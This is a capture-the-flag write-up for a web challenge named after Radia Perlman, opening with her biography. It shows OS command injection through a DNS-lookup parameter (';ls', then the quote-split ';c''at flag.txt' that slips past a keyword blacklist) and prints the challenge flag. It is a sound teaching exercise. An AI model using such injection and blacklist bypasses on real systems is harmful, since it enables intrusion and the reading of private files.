# CyberHeroines 2023

## Radia Perlman

> [Radia Joy Perlman](https://en.wikipedia.org/wiki/Radia_Perlman) (/ˈreɪdiə/;[1] born December 18, 1951) is an American computer programmer and network engineer. She is a major figure in assembling the networks and technology to enable what we now know as the internet. She is most famous for her invention of the spanning-tree protocol (STP), which is fundamental to the operation of network bridges, while working for Digital Equipment Corporation, thus earning her nickname "Mother of the Internet". Her innovations have made a huge impact on how networks self-organize and move data. She also made large contributions to many other areas of network design and standardization: for example, enabling today's link-state routing protocols, to be more robust, scalable, and easy to manage. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Radia_Perlman)
> 
> Chal: We thought we'd build a [webapp](https://cyberheroines-web-srv3.chals.io/) to help the [Mother of the Internet](https://www.youtube.com/watch?v=5D1v42nw25E) capture the flag.
>
>  Author: [Rusheel](https://github.com/Rusheelraj)
>

Tags: _web_

## Solution
We have a small web app giving us a quote from Radia Perlman and a link that allows execute dns queries.

```
Start out with finding the right problem to solve. This is a combination of "what customers are asking for", "what customers don’t even know they want yet", and "what can be solved with something simple to understand and manage"- Radia Perlman

We solved a problem you didnt even know you had. We built an online DNS Querying WebApp. Try querying cyberheroines.ctfd.io, by using /dns?ip=cyberheroines.ctfd.io
```

Clicking the link gives us

```
Command Output: Server: 172.31.0.2 Address: 172.31.0.2#53 Non-authoritative answer: Name: cyberheroines.ctfd.io Address: 165.227.251.183 Name: cyberheroines.ctfd.io Address: 165.227.251.182
```

Playing around with the parameter eventually gives us an error (`dns?ip=x`):

```
Error: Command failed: nslookup x 2>&1
```

Ok `nslookup` is used so the application could be vulnerable to command injection. We can try this by passing in `dns?ip=0.0.0.0;ls`.

```
Command Output: ** server can't find 0.0.0.0.in-addr.arpa: NXDOMAIN

code7.js
flag.txt
node_modules
package-lock.json
package.json
public
views
```

Giving us access to the [`code`](code7.js). Inspecting the code we can see there is a small blacklist for some commands:

```javascript
function isSafeInput(input) {
  const unsafeKeywords = ["cat", "tail", "less", "more", "awk", "&&", "head", "|", "$", "`", "<", ">", "&", "*"];
  return !unsafeKeywords.some(keyword => input.includes(keyword)) || input === "head";
}
```

But this can be easily bypassed `dns?ip=0.0.0.0;c''at flag.txt` giving us the flag.

Flag `chctf{1_l0v3_5p4wn1n6_n0d3_ch1ld_pr0c355}`